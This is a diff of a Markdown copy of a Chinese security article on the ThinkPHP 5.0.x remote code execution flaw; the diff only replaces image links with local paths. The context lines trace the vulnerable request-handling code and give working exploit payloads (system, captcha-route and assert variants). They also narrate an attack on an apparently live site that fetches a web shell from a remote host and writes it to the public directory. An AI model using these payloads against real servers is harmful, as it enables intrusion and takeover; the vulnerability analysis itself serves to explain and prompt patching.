@@ -51,7 +51,7 @@ previous_version: "POST:_method=__construct&filter[]=assert&get[]=assert($_POST[
 
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/itfVog0HMNf5CizM7-QF5w)
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/Ok4fxxCpBb5iby1CibzqOJb7UaSicQYJE8UUJ2sIfVkbGIZHlVuKonu3fet1SqoTCdfttmCcJGoC5do8GB2DpvsfQ/640?wx_fmt=jpeg)
+![](../../.resource/remote/f312650568c13579c1e903e2d78e6b7702eacea0d2272a824f1d086fc9472abe.jpg)
 
 >>>>
 
@@ -61,11 +61,11 @@ ThinkPHP 5.0.x(<=5.0.23) RCE 分析
 
 为了分析 5.0.23 之前所存在的安全问题，不妨在 Github 上查看 5.0.23 和 5.0.24 发行的 Change.log
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5iby1CibzqOJb7UaSicQYJE8UCBlCbgenZ3TIVzydCMP69yXaic2Tr2dDUZFPMU3aUq0WBia4xiakxQXsA/640?wx_fmt=png)
+![](../../.resource/remote/4d72925685338cdad92cbaf956c4bbcc9fe5a1063f5fd2dc500aa3eafe09c72d.png)
 
 可以看到 Request 类中对 method 方法进行了改进，而 Request 类是 ThinkPHP 中处理请求的文件，因此使用 Beyond Compare 对 5.0.23 和 5.0.24 进行比较发现：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5iby1CibzqOJb7UaSicQYJE8Uhplfw9hxU5lyA9EWGsJSJDS0iakx5jYv1Q9KqqdnxqY6nHvUx16GYZg/640?wx_fmt=png)
+![](../../.resource/remote/0106820737c8c2512e9d7378b5828838938c6fae7ea23716aba9336ee8bd050e.png)
 
 可以看到，在 5.0.24 中对 $this->method 新增了白名单过滤，只允许 $this->method 为常用的几个方法，否则就将其置为 POST 方法，因此我们的入口点就可以从 Request.php 跟进。
 
@@ -167,7 +167,7 @@ protected function getFilter($filter, $default)
 
 可以看到如果 $filter 不存在时，将 $filter 赋值为 $this->filter, 最后将 $filter[] 赋值为 null，注意此时并不是将 $filter[] 数组全部清空，只是使得 $filter[n+1]=null，即在数组的最后一个键名新增一个连续的键名，键值为 null
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5iby1CibzqOJb7UaSicQYJE8USMzBfV6iaqkqSyl0yBVH2ibhCCvJNMRp5G1jPwVh4DDRB2nk0yvibEOwA/640?wx_fmt=png)
+![](../../.resource/remote/cf324663a84f3151366ab7ef381f10016bb6b2713d45d043b8558899e111a869.png)
 
 回到 input 方法中，array_walk_recursive 函数会对第一个数组参数中的每个元素应用第二个参数的函数。在 input 类方法中，$data 中键名作为 filterValue(&$value, $key, $filters) 中的 value, 键值作为 key,filter 作为第三个参数 $filters, 而当这些传入到 filterValue 后，call_user_func 又是利用 filter 作为回调的函数，value 作为回调函数的参数，因此也就是 input 方法中的 data 是回调函数的参数，filter 是需要回调的函数。  
 
@@ -233,7 +233,7 @@ public function method($method = false)
 
 可以看到，当 $method 是 false 时，$this->method = strtoupper($_POST[Config::get('var_method')])，这是否是我们可控的参数，回到 TP 的系统配置文件上，
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5iby1CibzqOJb7UaSicQYJE8UOlbFScZVDPlC6Db2ZebHdtQJg6rLsXianEia1tUCJBx0zKbfIWmB2rOg/640?wx_fmt=png)
+![](../../.resource/remote/d6f2f8119f556187e13d4100fa25821df9a567b21e43a6d51f88e438332e362a.png)
 
 可以知道，Config::get('var_method')=='_method'，意味着 POST 上传_method 的值，是可以在 Request 类中进行的方法，即可以任意调用该类中存在的任何方法。
 
@@ -286,23 +286,23 @@ public function get($name = '', $default = null, $filter = '')
 
 thinkphp/library/think/Route.php
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5iby1CibzqOJb7UaSicQYJE8U22PRXMX9ic3ciaibbuRUrPnUIf6v33ZXAHvE2eZr7LPtic95MTSlhwYP7Q/640?wx_fmt=png)
+![](../../.resource/remote/0a9b1c31655a8de1e0dd67d05d90f86d4c0170be0e85873900e927873c98c80e.png)
 
 $request->method() 没有任何参数，选取默认参数为 false，符合上述的逻辑链，因此在全局搜索 $check 的上层利用链
 
 thinkphp/library/think/APP.app 中
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5iby1CibzqOJb7UaSicQYJE8U8hvYjyTEcg3gI7SblNZo2ArhRJPRfd28IaBjdjSiaicqfoz8dEmPzvZg/640?wx_fmt=png)
+![](../../.resource/remote/88e9af3cbd3045b953a66493a34183c02b5b9971d7659b97af6dee300e4dd3ae.png)
 
 该语句包含在 if($check) 条件下，只有 $check==true 时，才会进入执行该语句，可以看到路由检测中，如果 self::$routeCheck 为空，则会将 $condig['url_route_on'] 赋值给 $check，而在配置文件中该值默认为 ==true==。
 
 当我们跟随入口文件 index.php 时会发现，一定会调用 APP:run(), 该类为应用程序启动类，调用该方法执行应用，跟进
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5iby1CibzqOJb7UaSicQYJE8UC7tNKALqLHxiaXcJCseVE2qvdvnBXWG19RrEFVVMp00r3wxcGHsZP5A/640?wx_fmt=png)
+![](../../.resource/remote/2608ef9e44479991ff81604642da78793e84137f4192255eea22f521c9a123a2.png)
 
 当 $dispatch 为空时，调用 routeCheck 方法，跟进 Hook::listen('app_dispatch',self::$dispatch) 发现：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5iby1CibzqOJb7UaSicQYJE8UjyDR5Oh4ulPyE5EswWNzQVs6JQMnuJASrprc73cvHnqDxt5rU1oN1Q/640?wx_fmt=png)
+![](../../.resource/remote/2dd115baf5f126de0f84e91e914b59c724438d93664e1b75b664ce5e82baa69a.png)
 
 没有涉及 $dispatch，因此 self::$dispatch 为空，这样最终能够能够调用 $request->method() 方法，接下来是 Request 对象 param 方法的触发流程:
 
@@ -325,7 +325,7 @@ APP::run()
 POST:_method=__construct&filter[]=system&get[]=whoami  or _method=__construct&filter[]=system&route[]=whoami
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5iby1CibzqOJb7UaSicQYJE8UkAms0X9Egjg1BEWjZdXclyXJfObjRiacQvG3QxJIgXIgLn7G7F992Cg/640?wx_fmt=png)
+![](../../.resource/remote/41b45d84a7e87eec36f17d85ea1f5555ff4c322899552ecc9dba56a4eea20865.png)
 
 如果关闭了调试状态（通常情况下也会关闭调试状态），则需要搜索其他利用链
 
@@ -377,15 +377,15 @@ protected static function exec($dispatch, $config)
 
 APP:run() 中跟进 routeCheck() 方法：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5iby1CibzqOJb7UaSicQYJE8Udhqj1SgumvTFEfkrJlh630SdWz2uBaIe3kBa4vSDdT6JHzRWWdwDnw/640?wx_fmt=png)
+![](../../.resource/remote/4d400daa70469335e732abb2c4553216c6415a7673e1053af21ccea860a10dcb.png)
 
 路由有效时跟进 Route::check() 方法：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5iby1CibzqOJb7UaSicQYJE8UTOq4Jhc8q5sQcqJYRrCQZyGheyK6dexdrYkCwaez84k0iaHVUA9qCLQ/640?wx_fmt=png)
+![](../../.resource/remote/185cc19450e60be8f4850b6c974251e79f4967397e996c367d112b3455f3f24d.png)
 
 当我们需要 $dispatch[‘type’] 等于 controller 或者 method 时，最终跟进到 Route::parseRule 方法
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5iby1CibzqOJb7UaSicQYJE8UWMp4KJVGMSlRGQlvKVxjPC4uQsAfUq0PxEuLWAhuEdgDOHicKIdTj3w/640?wx_fmt=png)
+![](../../.resource/remote/1fb85afdb20658cd11d20036c920b812050dabeb69b197963f9c552dee62db37.png)
 
 当路由执行为路由到方法或者路由到控制器时都能使得 $result['type'] 满足，即最后 $dispatch[‘type’] 等于 controller 或者 method 而调用 param 方法。
 
@@ -395,15 +395,15 @@ ThinkPHP 路由地址表示定义的路由表达式最终需要路由到的地�
 
 而路由到控制器还是到方法等是取决于 $route，因此还需分析 $route 取值，在 checkRoute 的构造方法中：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5iby1CibzqOJb7UaSicQYJE8U6gXOrxg6jrEyJHeD7EOaFrPmgD847tMsDMySv39icheic2otic7QzhuTg/640?wx_fmt=png)
+![](../../.resource/remote/3dc5986511e60cdaa82c2040f14580e49ba95552e8b4b2d2c1a405b69e69c9da.png)
 
 因此分析 checkRoute 的上层利用链，在 Route::check() 方法中发现：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5iby1CibzqOJb7UaSicQYJE8UCpXAb0dhOPu6cBRUyXBRSv4UIlnpunV1PeW05y5cVYCGSIxXjlGlzQ/640?wx_fmt=png)
+![](../../.resource/remote/821ff4b0c94e768088f78fb88374b42a15162fa9a65eca7813ab81185b1a46ce.png)
 
 该 $method 可以通过变量覆盖将其改变，因此需要寻找注册 $method 值的路由，ThinkPHP5 中自带的验证码组件 captcha 注册了一个 get 路由规则，路由到类的方法，满足 case 条件。这里可以知道 method=get 是为了正确获取 captcha 的路由规则。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5iby1CibzqOJb7UaSicQYJE8UuUjjf3kOINAn09A2jOzlfVBPyiaGOxSC2aOsSLd6BZCvhmiav0u6ib0Tg/640?wx_fmt=png)
+![](../../.resource/remote/2fe060e007e2bc062c2a7fa11636265781375001a2bcbd1da7bb486760b7b67e.png)
 
 因此可以构造相应 payload
 
@@ -411,7 +411,7 @@ ThinkPHP 路由地址表示定义的路由表达式最终需要路由到的地�
 POST /index.php?s=captcha&_method=__construct&method=get&filter[]=system&get[]=ipconfig
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5iby1CibzqOJb7UaSicQYJE8UHW2CBKBrthgBibRhicIQxR85W3kMn2INb669iam6qdZr9gYNjEPdBpmzQ/640?wx_fmt=png)
+![](../../.resource/remote/26615630f026861347562ec87eebdafaea76bab9632e7d5560a6d907e3e1514d.png)
 
 >>>>
 
@@ -437,11 +437,11 @@ _method=__construct&method=GET&filter[]=think\__include_file&server[REQUEST_METH
 
 注意调用该方法时会进入 Request.php 中的 param 方法：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5iby1CibzqOJb7UaSicQYJE8UPTH00gNJycPCoYh2U8WpWgZwn1rZJVF8u4EtkVgLTXaZsyz2aiaOBJQ/640?wx_fmt=png)
+![](../../.resource/remote/92620929fc110db442b5dbdafbb4c2e04e2a8cef15f1462e0ad71ba530f087e6.png)
 
  method 方法本来是 false 默认参数，现在参数为 true，我们跟进看一下其逻辑:
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5iby1CibzqOJb7UaSicQYJE8Uiaka7IoGtuhGQ1Uk73v91JBBMp8fyictUWMzvmUibsicsMFa6nHOv7SDww/640?wx_fmt=png)
+![](../../.resource/remote/cc24a214767e8a7158159290a6bb09653078a0ac5632bb3a334cad64d1d10f1f.png)
 
 直接进入第一个 if 语句中，调用关键方法 server()，在不妨跟进:
 
@@ -466,7 +466,7 @@ public function server($name = '', $default = null, $filter = '')
 
 发现某站部署 Thinkphp v5 系统，并且在系统配置中是默认配置的 debug 模式：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5iby1CibzqOJb7UaSicQYJE8UeGE0OqxCSBWuhVLqIIR6VibAGhNiaPu4L5txtic7QtzibTnqav5D9icnvcA/640?wx_fmt=png)
+![](../../.resource/remote/2facfe77fb4f5785c4741f5691a74aa660ca3279b88b09703151e6016419a36a.png)
 
 在 debug 状态下，我们知道网站的绝对路径，并且 ThinkPHP 版本号为 V5.0.x，由于开启 debug 状态，构造相应 payload 进行探测
 
@@ -476,15 +476,15 @@ POST:_method=__construct&filter[]=system&get[]=whoami
 
 发现 php 配置文件中应该设置了 disabled_function:
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5iby1CibzqOJb7UaSicQYJE8UWYTQIibibdQAmTcprX0fZ05NvmfTeORzSpChuY8QuaicGb0JicraIuoDBQ/640?wx_fmt=png)
+![](../../.resource/remote/68ede1c222191c8e5c7a834d7845362af398e397fe31345da5b1e4a5ceda5ebe.png)
 
 我们知道在 phpinfo() 中即使加入参数，也不影响其执行，因此 call_user_func('phpinfo()','1') 同样能够执行
 
 先看一波 phpinfo 看看禁用哪些函数, 发现还设置了 open_basedir
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5iby1CibzqOJb7UaSicQYJE8UicYte4c7PdWBYea6iaFGLDPAO0hAHNicUPTH1vroc3bAX6WfXppokokow/640?wx_fmt=png)
+![](../../.resource/remote/7b17f962fbe578707123b3d249a13563ea8cd901f7415cdd3f048d57febf0b42.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5iby1CibzqOJb7UaSicQYJE8UnYBeTg2rO35sDFBjoGXzFjQIb76CQHnNmnunz6GE1dT9lKu0WgsM0g/640?wx_fmt=png)
+![](../../.resource/remote/182ee02a71cf9c3d723149958b1e18ad6fc4b97b8eaffba5c136adfa39325499.png)
 
 ```
 passthru,exec,system,chroot,chgrp,chown,shell_exec,popen,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru
@@ -504,7 +504,7 @@ POST:_method=__construct&filter[]=assert&get[]=assert($_POST[1]);
 POST:_method=__construct&filter[]=assert&get[]=assert($_POST[1]);&1=print(file_get_contents("./index.php"));
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5iby1CibzqOJb7UaSicQYJE8UBVO1dTibKCiazpyH8LVIO77zS9NBwwYgnBfaQn0cKhfpncNz31icILAPg/640?wx_fmt=png)
+![](../../.resource/remote/56b2db226342938b9f60d5db41d19c579fc2645c2137462461ff6eac34abc8ec.png)
 
 因此直接结合网站绝对路径，我们知道在 public 是面向用户的，我们可以利用 file_get_contents 读取马后使用 file_put_contents 写入到 public 目录下，这样就能够一句话进行连接
 
@@ -514,11 +514,11 @@ _method=__construct&filter[]=assert&get[]=$a=(file_get_contents("http://马的�
 
 最终 getshell
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5iby1CibzqOJb7UaSicQYJE8USCmVVIdwxCoHL3UVkEkk2ZmRNibvofic9RcxMKyxPH7iayLFF1lIDjRiaw/640?wx_fmt=png)
+![](../../.resource/remote/27ac9be53ae40b973277262eed28daee4faf654d2ab6586c18fa0b661004bf6c.png)
 
 可见如果目前还在使用 Thinkphp5.0 版本是十分危险的，应该及时更新版本或者相应打上补丁
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6OLwHohYU7UjX5anusw3ZzxxUKM0Ert9iaakSvib40glppuwsWytjDfiaFx1T25gsIWL5c8c7kicamxw/640?wx_fmt=png)
+![](../../.resource/remote/db4a3dba42ee97370de8c3ff242e46fc2421085d0acae62b630a7e388f761a3b.png)
 
   
 
@@ -539,7 +539,7 @@ _method=__construct&filter[]=assert&get[]=$a=(file_get_contents("http://马的�
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
   
-![](https://mmbiz.qpic.cn/mmbiz_gif/Ok4fxxCpBb5ZMeq0JBK8AOH3CVMApDrPvnibHjxDDT1mY2ic8ABv6zWUDq0VxcQ128rL7lxiaQrE1oTmjqInO89xA/640?wx_fmt=gif)  
+![](../../.resource/remote/632fd46fd9c5c81461bba0234f0d689bcd5e3937d9af2d92ada6ef08375280b1.gif)  
 
 ---------------------------------------------------------------------------------------------------------------------------------------------------
 
